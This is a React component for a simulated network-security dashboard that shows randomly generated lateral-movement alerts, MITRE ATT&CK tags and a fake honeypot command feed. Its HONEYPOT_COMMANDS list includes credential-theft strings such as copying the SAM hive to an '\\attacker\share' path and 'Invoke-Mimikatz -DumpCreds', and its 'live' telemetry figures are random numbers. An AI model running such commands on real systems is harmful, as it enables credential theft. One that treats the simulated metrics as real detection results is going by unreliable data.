import React, { useState, useEffect, useRef } from 'react';
import axios from 'axios';
import { Shield, Activity, Target, Clock, ShieldAlert, Cpu, Radio, Network, Lock, Power } from 'lucide-react';

// ── MITRE ATT&CK Lookup Table ──
const MITRE_MAP = {
  High: [
    { id: 'T1021', name: 'Remote Services', tactic: 'Lateral Movement' },
    { id: 'T1003', name: 'OS Credential Dumping', tactic: 'Credential Access' },
    { id: 'T1486', name: 'Data Encrypted for Impact', tactic: 'Impact' },
    { id: 'T1078', name: 'Valid Accounts', tactic: 'Persistence' },
  ],
  Medium: [
    { id: 'T1046', name: 'Network Service Discovery', tactic: 'Discovery' },
    { id: 'T1018', name: 'Remote System Discovery', tactic: 'Discovery' },
    { id: 'T1087', name: 'Account Discovery', tactic: 'Discovery' },
  ],
  Low: [
    { id: 'T1016', name: 'System Network Config Discovery', tactic: 'Discovery' },
    { id: 'T1049', name: 'System Network Connections', tactic: 'Discovery' },
  ],
};

const HONEYPOT_COMMANDS = [
  'whoami', 'net user /domain', 'dir /s C:\\backup', 'ipconfig /all',
  'net localgroup administrators', 'cmd.exe /c copy SAM \\\\attacker\\share',
  'reg query HKLM\\SECURITY', 'Invoke-Mimikatz -DumpCreds',
  'nmap -sV 10.0.0.0/24', 'python -c "import socket; s=socket.socket()"'
];

// ── Threat Generator ──
const endpoints = ['LAPTOP-HR-04', 'DEV-WORKSTATION-11', 'FINANCE-PC-07', 'VPN-USER-102', 'IT-ADMIN-LAP'];
const internal  = ['FILESERVER-02', 'AD-DC-01', 'EXCHANGE-SVR', 'DEV-DB-01', 'HR-APP-SRV'];
const targets   = ['DBSERVER-PROD', 'VAULT-CORE', 'PAYMENT-GATEWAY-01', 'BACKUP-NAS-01'];
const sev = ['High', 'High', 'Medium', 'Low'];
const highExp = [
  "Unexpected RDP session established outside business hours.",
  "Massive data payload transferred to restricted subnet.",
  "Credential dumping signature (Mimikatz) detected in payload.",
  "Rapid sequential port scan originating from compromised endpoint."
];
const medExp = [
  "Unusual volume of SSH connections attempted.",
  "Querying Active Directory for administrator groups.",
  "Ping sweep detected across internal subnet."
];
const lowExp = [
  "Pinging known servers at slightly abnormal intervals.",
  "Slightly higher than normal internal web traffic."
];

function generateLiveThreat(index) {
  const severity = sev[Math.floor(Math.random() * sev.length)];
  let baseScore = 0, exp = '';
  if (severity === 'High') { baseScore = 0.85 + Math.random() * 0.14; exp = highExp[Math.floor(Math.random() * highExp.length)]; }
  else if (severity === 'Medium') { baseScore = 0.45 + Math.random() * 0.39; exp = medExp[Math.floor(Math.random() * medExp.length)]; }
  else { baseScore = 0.10 + Math.random() * 0.34; exp = lowExp[Math.floor(Math.random() * lowExp.length)]; }
  
  const mitre = MITRE_MAP[severity][Math.floor(Math.random() * MITRE_MAP[severity].length)];
  const src = endpoints[Math.floor(Math.random() * endpoints.length)];
  const mid = internal[Math.floor(Math.random() * internal.length)];
  const dst = targets[Math.floor(Math.random() * targets.length)];
  
  const systems = 2 + Math.floor(Math.random() * 7);
  const minutes = 1 + Math.floor(Math.random() * 6);
  const multiplier = 4 + Math.floor(Math.random() * 12);
  const narrative = `${src} accessed ${systems} systems in ${minutes} min — ${multiplier}x above 30-day baseline`;

  return {
    id: `ev-${index}-${Date.now()}`,
    alertIdx: index,
    severity,
    anomaly_score: baseScore.toFixed(3),
    sbytes: 1000 + Math.random() * 50000,
    src, mid, dst,
    explanation: exp,
    mitre,
    narrative,
    timestamp: Date.now()
  };
}

// ── Shared UI Components ──
function ThreatTimer({ startTime, isResolved }) {
  const [elapsed, setElapsed] = useState(0);
  useEffect(() => {
    if(isResolved) return;
    const interval = setInterval(() => {
      setElapsed(Math.floor((Date.now() - startTime) / 1000));
    }, 1000);
    return () => clearInterval(interval);
  }, [startTime, isResolved]);

  const mins = String(Math.floor(elapsed / 60)).padStart(2, '0');
  const secs = String(elapsed % 60).padStart(2, '0');
  let urgency = 'var(--text-muted)';
  if(!isResolved) {
      urgency = elapsed > 30 ? 'var(--danger)' : elapsed > 15 ? 'var(--warn)' : 'var(--accent)';
  }

  return (
    <span style={{ fontSize: '0.65rem', color: urgency, fontFamily: 'monospace', transition: 'color 1s' }}>
      <Clock size={10} style={{ display: 'inline', marginRight: 3 }} />
      {isResolved ? 'CONTAINED' : `THREAT ACTIVE: ${mins}:${secs}`}
    </span>
  );
}

function HoneypotFeed({ timestamp }) {
  const [feed, setFeed] = useState([]);
  const feedRef = useRef(null);

  useEffect(() => {
    const addEntry = () => {
      const cmd = HONEYPOT_COMMANDS[Math.floor(Math.random() * HONEYPOT_COMMANDS.length)];
      const time = new Date().toLocaleTimeString('en-US', { hour12: false });
      setFeed(prev => [...prev.slice(-5), { cmd, time }]);
    };
    addEntry();
    const interval = setInterval(addEntry, 2800 + Math.random() * 2000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (feedRef.current) feedRef.current.scrollTop = feedRef.current.scrollHeight;
  }, [feed]);

  return (
    <div style={{ marginTop: '0.5rem', background: 'rgba(0,0,0,0.4)', borderRadius: 4, border: '1px solid rgba(6,182,212,0.3)', padding: '0.5rem' }}>
      <div style={{ fontSize: '0.6rem', color: '#06b6d4', marginBottom: '0.3rem', fontFamily: 'monospace', letterSpacing: 1 }}>
        🔴 LIVE HONEYPOT SESSION — ATTACKER CONTAINED
      </div>
      <div ref={feedRef} style={{ maxHeight: 80, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '0.2rem' }}>
        {feed.map((e, i) => (
          <div key={i} className="fade-in" style={{ fontSize: '0.6rem', fontFamily: 'monospace', color: '#94a3b8' }}>
            <span style={{ color: '#475569' }}>[{e.time}]</span>{' '}
            <span style={{ color: '#f59e0b' }}>attacker@honeypot</span>
            <span style={{ color: '#64748b' }}>:~$ </span>
            <span style={{ color: '#e2e8f0' }}>{e.cmd}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

// ── Main Dashboard ──
export default function Dashboard({ results, setResults, onBack, validatedAlerts, setValidatedAlerts }) {
  const [isLive, setIsLive] = useState(true);
  const [autoTrap, setAutoTrap] = useState(true); // Auto-TrapWeave AI Agent
  
  // Live Telemetry States
  const [totalScanned, setTotalScanned] = useState(9045812);
  const [activeSpeed, setActiveSpeed] = useState(14500);
  const [eventsCaught, setEventsCaught] = useState(0);

  // Initialize Results if empty
  useEffect(() => {
    if(!results) {
       setResults({ alerts: [] });
    }
  }, []); // Run once on mount

  // 1. Matrix Telemetry Counter Ticker (Runs 20x a second)
  useEffect(() => {
      if(!isLive) return;
      const interval = setInterval(() => {
          const tick = Math.floor(Math.random() * 1500 + 500);
          setTotalScanned(prev => prev + tick);
          setActiveSpeed(tick * 20); // Extrapolate to per-second avg
      }, 50);
      return () => clearInterval(interval);
  }, [isLive]);

  // 2. Continuous Threat Simulator (Pops an anomaly every 8-20 seconds)
  useEffect(() => {
      if(!isLive) return;
      
      const fireThreat = () => {
          setResults(prev => {
              const currentTotal = prev?.alerts?.length || 0;
              const newThreat = generateLiveThreat(currentTotal);
              const updated = [newThreat, ...(prev?.alerts || [])];
              return { alerts: updated };
          });
          setEventsCaught(prev => prev + 1);
          
          // Schedule next threat
          const nextDelay = 8000 + Math.random() * 12000;
          simTimeout = setTimeout(fireThreat, nextDelay);
      };

      // Start the very first threat after 2 seconds
      let simTimeout = setTimeout(fireThreat, 2000);
      return () => clearTimeout(simTimeout);
  }, [isLive]);

  // 3. Autonomous AI Auto-TrapWeave Agent
  useEffect(() => {
      if(!autoTrap || !isLive || !results?.alerts) return;

      // Find any 'High' severity threats that aren't validated yet
      const unvalidatedHighs = results.alerts.filter(a => a.severity === 'High' && !validatedAlerts.some(v => v.idx === a.alertIdx));
      
      unvalidatedHighs.forEach(highRisk => {
          // If 4 seconds have passed since detection, automatically contain it
          const elapsedMs = Date.now() - highRisk.timestamp;
          if (elapsedMs >= 3500) { // Fast response time
             validateAlert(highRisk.alertIdx, true);
          }
      });
      
      // We check this 10 times a second to ensure surgical autonomous timing
      const autoInterval = setInterval(() => {
         setResults(r => ({...r})); // Force re-eval
      }, 100);
      return () => clearInterval(autoInterval);

  }, [autoTrap, isLive, results, validatedAlerts]);


  const validateAlert = (idx, isRealThreat) => {
    // Only validate if not already validated
    if(validatedAlerts.some(v => v.idx === idx)) return;
    
    const timestamp = new Date().toLocaleTimeString('en-US', { hour12: false });
    setValidatedAlerts(prev => [...prev, { idx, isRealThreat, timestamp }]);
  };

  const sysHealthColor = isLive ? 'var(--success)' : 'var(--danger)';

  return (
    <div className="hud-overlay fade-in transition-all">
      {/* TOP LEFT: TITLE & MISSION */}
      <div className="hud-panel hud-top-left" style={{ borderLeftColor: sysHealthColor }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
          <div>
            <div className="title" style={{ fontSize: '1.4rem' }}>
               <Shield color="var(--accent)" /> LATERAL SHIELD
            </div>
            <div className="subtitle" style={{ display: 'flex', alignItems: 'center', gap: '0.4rem', color: sysHealthColor, marginTop: '0.2rem' }}>
              <div style={{ width: 8, height: 8, borderRadius: '50%', background: sysHealthColor, boxShadow: `0 0 10px ${sysHealthColor}` }} className={isLive ? "pulsing" : ""} />
              CORTEX AI: {isLive ? '24/7 ACTIVE SURVEILLANCE' : 'OFFLINE'}
            </div>
          </div>
          <button onClick={onBack} style={{ background: 'transparent', border: 'none', color: 'var(--text-muted)', cursor: 'pointer', fontSize: '0.75rem', textDecoration: 'underline' }}>
              [ BRIEFING ROOM ]
          </button>
        </div>
        
        <div style={{ marginTop: '1.2rem', display: 'flex', flexDirection: 'column', gap: '0.8rem' }}>
          <div style={{ background: 'rgba(56, 189, 248, 0.05)', borderLeft: '2px solid var(--accent)', padding: '0.5rem 0.75rem', fontSize: '0.75rem' }}>
            <strong style={{ color: '#fff', display: 'block', marginBottom: '0.2rem' }}><Network size={12} style={{ display: 'inline' }} /> CONTINUOUS INGESTION</strong>
            Zero-Trust East/West traffic scanner. Monitoring all internal lateral movements in real-time.
          </div>
          <div style={{ background: 'rgba(245, 158, 11, 0.05)', borderLeft: '2px solid var(--warn)', padding: '0.5rem 0.75rem', fontSize: '0.75rem' }}>
            <strong style={{ color: '#fff', display: 'block', marginBottom: '0.2rem' }}><Lock size={12} style={{ display: 'inline' }} /> ACTIVE DECEPTION RULES</strong>
            AI handles automated Honeypot (TrapWeave) deployments to instantaneously contain High-Risk threats.
          </div>
        </div>
      </div>

      {/* BOTTOM LEFT: SYSTEM COMMANDS & AUTONOMY */}
      <div className="hud-panel hud-bottom-left">
        <h3><Settings size={14} style={{ display: 'inline', verticalAlign: 'middle' }} /> SYSTEM ADMINISTRATION</h3>
        
        <div style={{ marginTop: '1rem', display: 'flex', flexDirection: 'column', gap: '1rem' }}>
            <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', background:'rgba(255,255,255,0.03)', padding:'0.75rem', border:'1px solid var(--border)', borderRadius: '4px' }}>
                <div>
                   <div style={{ fontSize:'0.75rem', color:'#fff', fontWeight:'bold' }}>CORE AI SURVEILLANCE</div>
                   <div style={{ fontSize:'0.65rem', color:'var(--text-muted)' }}>Toggle entire 24/7 scanning pipeline</div>
                </div>
                <button 
                  onClick={() => setIsLive(!isLive)}
                  style={{ background: isLive ? 'rgba(52,211,153,0.1)' : 'rgba(239,68,68,0.1)', color: isLive ? 'var(--success)' : 'var(--danger)', padding: '0.5rem 1rem', border: `1px solid ${isLive ? 'var(--success)' : 'var(--danger)'}`, borderRadius: '4px', cursor: 'pointer', fontWeight:'bold', display:'flex', alignItems:'center', gap:'0.4rem' }}>
                  <Power size={14} /> {isLive ? 'SYSTEM ONLINE' : 'SYSTEM OFFLINE'}
                </button>
            </div>

            <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', background:'rgba(255,255,255,0.03)', padding:'0.75rem', border:'1px solid var(--border)', borderRadius: '4px' }}>
                <div>
                   <div style={{ fontSize:'0.75rem', color:'#fff', fontWeight:'bold' }}>AUTO-TRAPWEAVE (A.I. RESPONSE)</div>
                   <div style={{ fontSize:'0.65rem', color:'var(--text-muted)' }}>Instant, autonomous High-Risk containment</div>
                </div>
                <button 
                  onClick={() => setAutoTrap(!autoTrap)}
                  style={{ background: autoTrap ? 'rgba(56,189,248,0.1)' : 'rgba(255,255,255,0.05)', color: autoTrap ? 'var(--accent)' : 'var(--text-muted)', padding: '0.5rem 1rem', border: `1px solid ${autoTrap ? 'var(--accent)' : 'var(--border)'}`, borderRadius: '4px', cursor: 'pointer', fontWeight:'bold', display:'flex', alignItems:'center', gap:'0.4rem' }}>
                  <ShieldAlert size={14} /> {autoTrap ? 'AUTONOMOUS' : 'MANUAL'}
                </button>
            </div>
        </div>
      </div>

      {/* TOP RIGHT: LIVE TELEMETRY DASHBOARD */}
      <div className="hud-panel hud-top-right">
        <h3><Radio size={14} style={{ display: 'inline', verticalAlign: 'middle' }} className={isLive ? 'pulsing' : ''} /> LIVE TRAFFIC TELEMETRY</h3>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginTop: '1rem' }}>
            <div>
              <div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>THROUGHPUT SPEED</div>
              <div className="mono" style={{ fontSize: '1.6rem', color: isLive ? 'var(--accent)' : 'var(--text-muted)', textShadow: isLive ? '0 0 10px var(--accent-glow)' : 'none', transition: 'color 0.3s' }}>
                  {(activeSpeed / 1000).toFixed(2)}K / s
              </div>
            </div>
            <div>
              <div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>TOTAL PACKETS INSPECTED</div>
              <div className="mono" style={{ fontSize: '1.6rem', color: '#f8fafc' }}>
                  {totalScanned.toLocaleString()}
              </div>
            </div>
            <div>
              <div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>ISOLATION FOREST NODES</div>
              <div className="mono" style={{ fontSize: '1.4rem', color: '#94a3b8' }}>14,024</div>
            </div>
            <div>
              <div style={{ fontSize: '0.65rem', color: 'var(--text-muted)' }}>THREATS INTERCEPTED</div>
              <div className="mono" style={{ fontSize: '1.6rem', color: eventsCaught > 0 ? 'var(--danger)' : '#cbd5e1', textShadow: eventsCaught > 0 ? '0 0 10px var(--danger-glow)' : 'none' }}>
                  {eventsCaught}
              </div>
            </div>
        </div>
      </div>

      {/* BOTTOM RIGHT: LIVE ALERT QUEUE */}
      <div className="hud-panel hud-bottom-right" style={{ maxHeight: 'calc(100vh - 280px)', overflow: 'hidden', display: 'flex', flexDirection: 'column' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.5rem' }}>
          <h3><ShieldAlert size={14} style={{ display: 'inline', verticalAlign: 'middle' }} /> ACTIVE THREAT FEED</h3>
          {isLive && <div style={{ fontSize: '0.65rem', color: 'var(--success)' }} className="pulsing">SCANNING TRAFFIC...</div>}
        </div>
        
        <div className="alert-list" style={{ flex: 1, overflowY: 'auto' }}>
          {!results?.alerts || results.alerts.length === 0 ? (
            <div style={{ fontSize: '0.75rem', color: 'var(--success)', textAlign: 'center', marginTop: '3rem' }}>
              <ShieldCheck size={32} style={{ margin: '0 auto 1rem', color: 'var(--success)', opacity: 0.8 }} className="pulsing" />
              NETWORK SECURE — NO LATERAL ANOMALIES
            </div>
          ) : (
            results.alerts.map((a, i) => {
              const validation = validatedAlerts.find(v => v.idx === a.alertIdx);
              const riskColor = a.severity === 'High' ? 'var(--danger)' : (a.severity === 'Medium' ? 'var(--warn)' : 'var(--text-muted)');
              
              return (
                <div className="alert-item fade-in" key={a.id} style={{ borderLeftColor: riskColor, background: validation ? 'rgba(255,255,255,0.02)' : 'rgba(255,255,255,0.05)' }}>
                  <div style={{ flex: 1 }}>
                    {/* Header */}
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <span style={{ color: '#fff', fontSize: '0.7rem' }}>{a.severity.toUpperCase()} RISK EVENT</span>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                        <ThreatTimer startTime={a.timestamp} isResolved={!!validation} />
                        <span className="alert-score" style={{ color: riskColor, fontSize: '0.7rem', fontFamily: 'monospace' }}>{Number(a.anomaly_score).toFixed(3)}</span>
                      </div>
                    </div>

                    {/* 3-Hop lateral path */}
                    <div style={{ color: '#fff', fontSize: '0.68rem', marginTop: '0.3rem', display: 'flex', alignItems: 'center', gap: '0.3rem', fontFamily: 'monospace', flexWrap: 'wrap' }}>
                      {a.src} <span style={{ color: 'var(--accent)' }}>→</span> {a.mid} <span style={{ color: 'var(--accent)' }}>→</span> <span style={{ color: riskColor }}>{a.dst}</span>
                    </div>

                    {/* Attack narrative */}
                    {a.narrative && (
                      <div style={{ marginTop: '0.25rem', fontSize: '0.68rem', color: '#f8fafc', background: 'rgba(239,68,68,0.07)', borderLeft: `2px solid ${riskColor}`, paddingLeft: '0.4rem', lineHeight: 1.4 }}>
                        {a.narrative}
                      </div>
                    )}

                    {/* Plain English explanation */}
                    <div style={{ color: 'var(--text-muted)', fontSize: '0.63rem', marginTop: '0.3rem', fontStyle: 'italic', lineHeight: '1.4' }}>
                      "{a.explanation}"
                    </div>

                    {/* MITRE ATT&CK badge */}
                    {a.mitre && (
                      <div style={{ marginTop: '0.3rem', display: 'inline-flex', alignItems: 'center', gap: '0.3rem', background: 'rgba(139, 92, 246, 0.15)', border: '1px solid rgba(139, 92, 246, 0.4)', borderRadius: 3, padding: '0.1rem 0.4rem', fontSize: '0.58rem', fontFamily: 'monospace', color: '#a78bfa' }}>
                        ⚑ MITRE {a.mitre.id} — {a.mitre.name} <span style={{ color: '#7c3aed' }}>({a.mitre.tactic})</span>
                      </div>
                    )}

                    {/* Actions / Containment Log */}
                    <div style={{ marginTop: '0.5rem', borderTop: '1px dotted rgba(255,255,255,0.1)', paddingTop: '0.5rem' }}>
                      {validation ? (
                        <div className="fade-in">
                          <div style={{ fontSize: '0.63rem', fontWeight: 'bold', color: validation.isRealThreat ? '#000' : 'var(--success)', padding: '0.4rem', background: validation.isRealThreat ? 'var(--accent)' : 'rgba(52, 211, 153, 0.05)', border: validation.isRealThreat ? '1px solid var(--accent)' : '1px solid var(--success)', borderRadius: 4, boxShadow: validation.isRealThreat ? '0 0 15px var(--accent-glow)' : 'none', textAlign: 'center', fontFamily: 'monospace' }}>
                            {validation.isRealThreat ? `🕸️ Honeypot deployed at ${validation.timestamp} — attacker redirected` : '✅ FALSE POSITIVE (IGNORED)'}
                          </div>
                          {validation.isRealThreat && <HoneypotFeed timestamp={validation.timestamp} />}
                        </div>
                      ) : (
                        <div style={{ display: 'flex', gap: '0.5rem' }}>
                          <button onClick={() => validateAlert(a.alertIdx, false)} style={{ flex: 1, background: 'rgba(52, 211, 153, 0.1)', color: 'var(--success)', border: '1px solid var(--success)', borderRadius: 4, cursor: 'pointer', padding: '0.25rem', fontSize: '0.6rem' }}>
                            Allow (False Pos)
                          </button>
                          {a.severity !== 'Low' && (
                            <button onClick={() => validateAlert(a.alertIdx, true)} style={{ flex: 1, background: 'rgba(56, 189, 248, 0.1)', color: 'var(--accent)', border: '1px solid var(--accent)', borderRadius: 4, cursor: 'pointer', padding: '0.25rem', fontSize: '0.6rem', boxShadow: '0 0 10px rgba(56, 189, 248, 0.3)' }}>
                              Deploy TrapWeave
                            </button>
                          )}
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              );
            })
          )}
        </div>
      </div>
    </div>
  );
}
